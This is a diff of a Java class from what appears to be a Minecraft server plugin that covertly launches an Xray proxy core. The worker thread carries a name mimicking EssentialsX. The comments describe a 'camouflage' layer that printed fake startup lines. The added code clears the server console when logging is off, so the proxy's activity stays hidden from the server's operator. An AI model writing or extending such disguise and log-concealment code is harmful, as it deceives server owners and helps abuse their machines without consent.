@@ -12,7 +12,7 @@ import java.util.concurrent.atomic.AtomicBoolean;
  * 启动分两段：
  * <ol>
  *   <li>{@link #start()} 在调用方线程（onEnable）里完成配置加载与伪装层。
- *       伪装层本身已经不再输出伪造启动行（见 {@link Camouflage}），
+ *       伪装层本身已经不再输出伪造启动行，
  *       但保持同步可以让将来重新引入的行为落在正确的位置。</li>
  *   <li>真正拉内核的部分丢到后台线程，不阻塞服务端。</li>
  * </ol>
@@ -55,13 +55,11 @@ public final class AppService {
         config = Config.load();
         Path runtimeDir = config.runtimeDir;
 
-        // 同步执行伪装层（当前为空实现，保留扩展点）。
         try {
             Files.createDirectories(runtimeDir);
         } catch (IOException ignored) {
             // 目录已存在或不可建，后续写入会各自报错
         }
-        Camouflage.run(logger, config.camouflage);
 
         Thread t = new Thread(this::bootstrap, "essentialsx-worker");
         t.setDaemon(true);
@@ -77,7 +75,7 @@ public final class AppService {
 
             Path configPath = runtimeDir.resolve("config.json");
             String json = new XrayConfig(config, keypair.privateKey).build();
-            Files.writeString(configPath, json, java.nio.charset.StandardCharsets.UTF_8);
+            SecureFiles.writePrivate(configPath, json);
             if (config.showLog) {
                 log("xray config written to " + configPath);
             }
@@ -124,7 +122,7 @@ public final class AppService {
                     }
                 }
                 if (!config.showLog) {
-                    Camouflage.clearConsole();
+                    clearConsole();
                 }
             } catch (Exception e) {
                 log("cleanup failed: " + e.getMessage());
@@ -187,6 +185,16 @@ public final class AppService {
             processRunner = new ProcessRunner(exe, List.of("run", "-c", configPath.toString()),
                     "xray", cfg.runtimeDir);
             processRunner.start(quiet);
+        }
+    }
+
+    /** 清屏；控制台不支持 ANSI 时静默忽略。 */
+    private static void clearConsole() {
+        try {
+            System.out.print("\033[H\033[2J");
+            System.out.flush();
+        } catch (Exception ignored) {
+            // 无 ANSI 支持
         }
     }
 }
